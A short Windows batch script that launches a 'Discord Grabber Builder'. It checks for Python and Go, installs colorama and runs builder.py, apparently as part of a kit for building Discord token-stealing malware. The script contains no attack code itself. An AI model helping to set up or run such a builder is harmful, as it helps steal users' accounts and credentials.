@echo off
title Discord Grabber Builder
setlocal enabledelayedexpansion

:: Check Python
echo [*] Checking Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found!
    echo [*] Please install Python from: https://python.org
    echo [*] Make sure to check 'Add to PATH' during installation
    pause
    exit /b 1
)
for /f "tokens=2" %%i in ('python --version 2^>^&1') do echo [+] Python found: %%i

:: Check Go
echo [*] Checking Go installation...
go version >nul 2>&1
if errorlevel 1 (
    echo [!] Go not found!
    echo [*] Please install Go from: https://golang.org/dl
    pause
    exit /b 1
)
for /f "tokens=3" %%i in ('go version') do echo [+] Go found: %%i

:: Install Python dependencies
echo [*] Installing Python dependencies...
python -m pip install colorama >nul 2>&1
echo [+] Dependencies installed

:: Clear screen and run builder
cls
python builder.py

pause